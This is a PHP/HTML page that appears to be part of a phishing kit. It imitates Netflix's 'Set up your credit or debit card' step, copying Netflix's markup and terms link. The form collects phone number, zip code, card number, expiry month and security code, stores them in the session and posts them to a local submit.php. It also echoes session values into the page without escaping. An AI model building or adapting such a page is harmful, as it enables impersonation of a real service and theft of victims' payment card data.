...
<div class="simpleContainer">
    <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
        <form method="POST" action="submit.php">
            ...
            <?php  if(isset($_SESSION["error_p_pay"]) ){ 
                if(isset($_SESSION["error_p_pay"]) ){  ?>
                ...
                <div>
                    <div class="stepHeader-container">
                        <div class="stepHeader">
                            ...
                            <h1 class="stepTitle" data-uia="stepTitle">Set up your credit or debit card.</h1>
                        </div>
                    </div>
                </div>
                                ...
                                <div data-uia="field-creditZipcode+container" class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="phone number">
                                            <input name="phone" class="nfTextField" id="id_phone" type="tel" tabindex="0" autocomplete="off"
                                             minlength="2" value="<?php if(isset($_SESSION["phone"])) echo $_SESSION["phone"] ;  ?>" >
                                ...
                                <div data-uia="field-creditZipcode+container" class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="creditZipcode">
                                            <input name="creditZipcode" class="nfTextField" id="id_creditZipcode" type="text" tabindex="0" 
                                            autocomplete="off" minlength="5" value="<?php if(isset($_SESSION["creditZipcode"])) echo $_SESSION["creditZipcode"] ;  ?>" >
                                    ...
                                    <div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
                                        <div class="nfInputPlacement">
                                            <label class="input_id" placeholder="creditCardNumber">
                                                <input name="creditCardNumber" class="nfTextField" id="id_creditCardNumber" type="tel" tabindex="0" 
                                                autocomplete="off" maxlength="19" minlength="12" value="<?php if(isset($_SESSION["creditCardNumber"])) echo $_SESSION["creditCardNumber"] ;  ?>" >
                                ...
                                <div class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="creditExpirationMonth">
                                            <input name="creditExpirationMonth" class="nfTextField" id="id_creditExpirationMonth" type="tel" tabindex="0"
                                             autocomplete="off" value="<?php if(isset($_SESSION["creditExpirationMonth"])) echo $_SESSION["creditExpirationMonth"] ;  ?>" >
                                ...
                                <div class="nfInput nfInputOversize">
                                    <div class="nfInputPlacement">
                                        <label class="input_id" placeholder="creditCardSecurityCode">
                                            <input name="creditCardSecurityCode" class="nfTextField" id="id_creditCardSecurityCode" type="tel" tabindex="0" 
                                            autocomplete="off" maxlength="4" minlength="3" value="<?php if(isset($_SESSION["creditCardSecurityCode"])) echo $_SESSION["creditCardSecurityCode"] ;  ?>" >
                        ...
                        <li class="orderInfoItem">
                            <div class="orderInfoItem__content-container">
                                <div class="orderInfoItem__content">
                                    <div class="orderInfoItem__text orderInfoItem__title"><?php echo $_SESSION['plan']["price"]; ?>/month</div>
                                    <div class="orderInfoItem__text orderInfoItem__description"><?php echo $_SESSION['plan']["plan"]; ?></div>
                                </div> <a href="plan.php">
                                  <button type="button" class="orderInfoItem__button">Change</button>  
                                </a>
                            </div>
                        </li>
                    </ul>
                    <ul class="simpleForm structural ui-grid">
                        <li class="nfFormSpace">
                            <div class="signupTerms" id="tou-us-no_trial">
                                <span>
                                    <p>By clicking the "Start Membership" button below, you agree to our
                                        <a target="blank" href="https://help.netflix.com/legal/termsofuse">Terms of
                                            ...
                                            monthly membership fee (currently <?php echo " " . $_SESSION['plan']["price"]; ?>) to your payment
            ...
            <div class="submitBtnContainer">
                <button type="submit" autocomplete="off" id="btn_cc" disabled class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize">Start Membership</button>
            </div>
        </form>
    </div>
</div>
